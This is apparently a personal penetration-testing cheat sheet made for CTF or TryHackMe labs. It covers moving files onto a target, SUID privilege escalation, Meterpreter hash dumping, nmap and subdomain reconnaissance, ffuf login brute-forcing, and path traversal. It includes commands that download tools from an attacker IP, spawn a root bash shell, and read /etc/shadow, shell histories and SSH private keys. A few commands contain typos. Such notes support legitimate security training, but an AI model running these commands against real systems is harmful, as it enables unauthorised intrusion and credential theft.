- [Getting file into target](#getting-file-into-target)
- [Working with executables](#working-with-executables)
  - [finding them](#finding-them)
- [browsing important files](#browsing-important-files)
- [Metasploit with database](#metasploit-with-database)
  - [Meterpreter (payload)](#meterpreter-payload)
  - [Recoinaissance](#recoinaissance)
- [Basic Enum](#basic-enum)
- [Web hacking](#web-hacking)
  - [Subdomain](#subdomain)
  - [Wildcards](#wildcards)
  - [User enumeration](#user-enumeration)
  - [IDOR](#idor)
  - [File inclusion](#file-inclusion)
- [Usefull Windows commands](#usefull-windows-commands)

# Getting file into target
- Option 1 - starting local server
  1. python3 -m http.server 8000
  2. wget attacker-machine:8000:file.ext
  3. make executable: chmod +x file.ext
- Option 2 - copy source
  1. Copy code from source and past in the target + save .sh
  2. make executable: chmod +x file.ext

# Working with executables

## finding them
- Option 1
  - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

- Option 2
  - strings /usr/local/bin/suid-env2
  - /bin/bash --version < 4.2
  - function /usr/sbin/service { /bin/bash -p; }
  - export -f /usr/sbin/service
  - /usr/local/bin/suid-env2

# browsing important files  
- History
  - cat ~/.*history | less
  - .ssh Folder is always a must

# Metasploit with database

1. service postgresql start
2. service metasploit start
3. update-rc.d postgresql enable *for performance*
4. update-rc.d metasploit enable *for performance*
5. db_rebuild_cache [in msf console] *for performance*

- db_command ==> db_status, db_nmap etc

- workspace -a (add)
- workspace -d (delete)
- workspace name (move to name)

## Meterpreter (payload)
- hashdump (migrate to process first)
- getpid
- getpriv
- migrate PID [try and error, migrating to existing process] + check hashdump
- search

## Recoinaissance

- db_nmap [--script vuln] -sC (common scripts) -A (OS) -sS (Syn) -p- (all ports) -sV (versions) -Pn (no ping)
  - --scrip vuln: most commom vulnerability scrips, CVEs will be shown
  - -sC: other common scripts
  - -A: basic scann with OS include
  - -sS: syn
  - -p-: all ports
  - -sV: version of services vound
  - -Pn: no ping

- hosts: list hosts from db
  - -a: add
  - -d: delete
  - -R: inside a exploit/scanner to add the scanned host as RHOST

- services: display services found in scans
 - From services google for vulnerabilities /also search in metasploit
 - Common services: http, ftp, smb, ssh, rdp

# Basic Enum
- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 

# Web hacking

## Subdomain
- search certificates: 
  - https://transparencyreport.google.com/https/overview
  - https://crt.sh/
    - $ curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt
    - curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-certspotter.txt
- Google search engine: site:*.domain.com
- dnsrecon

 
## Wildcards 
- A lot of false positive
- need to be filtered
- 
- dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force
  
- OWAPS *Amass*: amass -src -ip -active -brute -d
  - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
  - amass -passive -d domain.de -src
  - $ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
  - https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a

- Create wordlist (from commands above)
  - sed 's/$/.<domain>/' subdomains-top1mil-20000.txt > hosts-wordlist.txt
  
## User enumeration
-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
   -  the *FUZZ* will be replaced by the items in the wordlist

- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
- https://tryhackme.com/room/authenticationbypass

## IDOR
Insecure Direct Object Request

## File inclusion
- insecure input validation
- path traversal: ../../../etc/passwd
- Important files
  - /etc/issue - system identification
  - /etc/profile - default variables terminal
  - /proc/version - kernen versel
  - /etc/shadow - users password
  - /root/.bash_history
  - /var/log/dmessage
  - /root/.ssh/id_rsa = private rsa key
  - /var/log/apache2/access.log
  - C:\boot.ini (windows)


- null byte = %00, injection (terminate string)
- curl -X METHOD -d [data]
- 
# Usefull Windows commands
- Find file: wmic find users || dir /p datei.txt (find file)
- Windows: get file 
- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"

